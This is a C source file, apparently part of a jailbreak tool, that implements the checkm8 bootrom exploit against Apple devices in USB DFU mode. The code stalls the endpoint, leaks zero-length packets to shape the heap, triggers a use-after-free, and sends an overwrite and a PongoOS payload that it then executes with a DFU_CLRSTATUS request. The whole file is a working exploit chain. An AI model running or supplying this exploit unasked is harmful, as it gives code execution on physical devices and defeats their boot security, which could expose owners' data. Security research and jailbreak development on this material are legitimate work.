#include "checkm8.h"

#include <stdlib.h>
#include <stdbool.h>

#include "../utils/log.h"

#ifndef __APPLE__
# include "usb-libusb.h"
#endif
#include "dfu.h"
#include "payload.h"

// Start a new DFU transfer or continue an existing one
// Once finished, DFU will be ready for checkm8
bool checkm8_reset(usb_handle_t *handle) {
    transfer_ret_t transferRet;

    // Send zero-length packet to end existing transfer
    bool ret = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet);
    if (!ret) { goto fail; }
    if (transferRet.ret != USB_TRANSFER_OK || transferRet.sz != DFU_FILE_SUFFIX_LENGTH) { return false; }

    // Requests image validation like we are about to boot it
    ret = dfu_device_set_await_reset(handle);
    if (!ret) { goto fail; }

    // Start a new DFU transfer
    ret = send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet);
    if (!ret) { goto fail; }
    if (transferRet.ret != USB_TRANSFER_OK || transferRet.sz != EP0_MAX_PACKET_SIZE) { goto fail; }

    // Ready for checkm8
    return true;

fail:
    // DFU abort on failure
    send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    LOG("Failed to reset device.");
    return false;
}

bool checkm8_stall(usb_handle_t *handle) {
    int usbAbortTimeout = 10;
    transfer_ret_t transferRet;
    while (send_usb_control_request_async_no_data(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0xC0, usbAbortTimeout, &transferRet)) {
        if (transferRet.sz < 0xC0
        && send_usb_control_request_async_no_data(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0x40, 1, &transferRet)
        && transferRet.sz == 0) {
            LOG("Stalled device.");
            return true;
        }
        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    LOG("Failed to stall device!");
    return false;
}

bool checkm8_usb_request_stall(usb_handle_t *handle) {
    return send_usb_control_request_no_data(handle, 0x2, DFU_GETSTATUS, 0, 0x80, 0, NULL);
}

bool checkm8_send_leaking_zlp(usb_handle_t *handle) {
    return send_usb_control_request_no_data(handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, NULL);
}

bool checkm8_send_normal_zlp(usb_handle_t *handle) {
    return send_usb_control_request_no_data(handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, NULL);
}

bool checkm8_heap_feng_shui(usb_handle_t *handle, struct DeviceConfiguration *config) {
    if (config->largeLeak == 0) {
        if (config->cpid >= 0x7000 && config->cpid <= 0x8003 && config->cpid != 0x8001) {
            while (!checkm8_usb_request_stall(handle) || !checkm8_send_leaking_zlp(handle) || !checkm8_send_normal_zlp(handle)) { }
        } else {
            // Stall endpoint (and leak a packet)
            if (!checkm8_stall(handle)) { return false; }

            // Send enough packets to fill the hole
            LOG( "Sending %d normal ZLPs.", config->hole);
            for (int i = 0; i < config->hole; i++) {
                if (!checkm8_send_normal_zlp(handle)) { return false; }
            }

            // Add another leaking packet the end of the hole
            if (!checkm8_send_leaking_zlp(handle)) { return false; }

            // Make sure the conditions are correct
            // So that the packets are actually leaked
            // (latest wLength > queued packet wLength)
            if (!checkm8_send_normal_zlp(handle)) { return false; }
        }
    } else { // Unused as we don't have A7/A6 support yet

        // All packets are leaked - fill out the heap
        // such that there is a hole at the end for the IO buffer
        for (int i = 0; i < config->largeLeak; i++) {
            checkm8_usb_request_stall(handle);
        }

        // Abort DFU and leak the packets
        send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    }
    return true;
}

bool checkm8_trigger_UaF(usb_handle_t *handle, struct DeviceConfiguration *config) {
    unsigned usbAbortTimeout = USB_TIMEOUT;
    transfer_ret_t transferRet;

    // Keep asynchonously sending packets until we get a stall (which is actually the data not being sent)
    while (send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SIZE, usbAbortTimeout, &transferRet)) {
        // Overwrite padding to ensure we overwrite the correct data
        if (transferRet.sz < config->overwritePadding
        && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config->overwritePadding - transferRet.sz, &transferRet)
        && transferRet.ret == USB_TRANSFER_STALL) {

            // DFU abort and trigger the UaF
            send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
            return true;
        }

        // If we don't get a stall, something went wrong
        if (!send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
            break;
        }

        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    return false;
}

#ifndef MIN
# define MIN(a, b) ((a) < (b) ? (a) : (b))
#endif

bool checkm8_send_overwrite_and_payload(usb_handle_t *handle, struct DeviceConfiguration *deviceConfig, struct PayloadConfiguration *payloadConfig) {
    size_t overwriteSize = 0;
    size_t payloadSize = 0;

    uint8_t *overwrite = create_pongo_overwrite_for_device(payloadConfig, &overwriteSize);
    uint8_t *payload = create_pongo_payload_for_device(deviceConfig, &payloadSize);

    if (!overwrite || overwriteSize == 0) {
        LOG("Failed to generate overwrite!");
        goto cleanup;
    }

    if (!payload || payloadSize == 0) {
        LOG( "Failed to generate payload!");
        goto cleanup;
    }

    transfer_ret_t transferRet;

    // Why is this needed?
    if (deviceConfig->cpid >= 0x8001 && deviceConfig->cpid <= 0x8015 && deviceConfig->cpid != 0x8003) {
        if (!checkm8_usb_request_stall(handle)) { goto cleanup; }
        if (!checkm8_send_leaking_zlp(handle)) { goto cleanup; }
    }
	send_usb_control_request_no_data(handle, 2, DFU_GETSTATUS, 0, 0x80, 0, NULL);
	send_usb_control_request_no_data(handle, 2, DFU_GETSTATUS, 0, 0x80, 0, NULL);

    // Send overwrite and make sure the endpoint is still stalled
    if (send_usb_control_request(handle, 0, 0, 0, 0, overwrite, overwriteSize, &transferRet)
    && transferRet.ret == USB_TRANSFER_STALL) {
        // Reset the global state so we can send our payload?
        bool ret = true;
        size_t packetSize = 0;

        for (int i = 0; ret && i < payloadSize; i += packetSize) {
            packetSize = MIN(payloadSize - i, DFU_MAX_TRANSFER_SIZE);
            LOG( "Sending payload chunk of size 0x%x.", packetSize);
            // Send payload chunk
            ret = send_usb_control_request(handle, 0x21, DFU_DNLOAD, 0, 0, &payload[i], packetSize, NULL);
        }

        if (ret) {
            // T8011 is fragile...
            if (deviceConfig->cpid != 0x8011) {
                send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, NULL);
                send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
            }
        } else {
            LOG("Failed to send payload!");
        }

        // This is the trigger for execution
        ret = send_usb_control_request_no_data(handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
        LOG("Checkmate!");

        if (overwrite != NULL) { free(overwrite); }
        return true;
    } else {
        LOG("Failed to send overwrite!");
    }

cleanup:
    return false;
}
